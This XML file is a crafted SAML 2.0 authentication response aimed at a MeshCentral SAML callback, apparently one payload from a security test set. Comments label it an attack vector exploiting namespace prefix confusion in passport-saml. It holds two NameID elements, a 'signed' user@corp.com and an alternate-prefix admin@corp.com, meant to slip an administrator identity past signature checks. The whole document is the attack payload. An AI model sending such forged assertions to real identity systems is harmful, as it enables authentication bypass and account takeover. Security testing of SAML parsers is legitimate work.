<?xml version="1.0" encoding="UTF-8"?>
<!-- VECTOR: Namespace prefix confusion — nameID in alternate ns prefix; passport-saml xpath may match on local-name() differently than strict ns-aware parsers -->
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_ns001"
                Version="2.0"
                IssueInstant="2026-01-01T00:00:00Z"
                Destination="https://meshcentral.example.com/auth-saml-callback">
  <saml:Issuer>https://idp.example.com/saml</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="_assertion_ns" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">
    <saml:Issuer>https://idp.example.com/saml</saml:Issuer>
    <saml:Subject>
      <!-- Duplicate NameID: one with saml: prefix (signed), one with saml2: (alternate prefix, same NS URI) -->
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">user@corp.com</saml:NameID>
      <saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">admin@corp.com</saml2:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2099-01-01T00:00:00Z"
                                      Recipient="https://meshcentral.example.com/auth-saml-callback"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z">
      <saml:AudienceRestriction>
        <saml:Audience>meshcentral</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
  </saml:Assertion>
</samlp:Response>
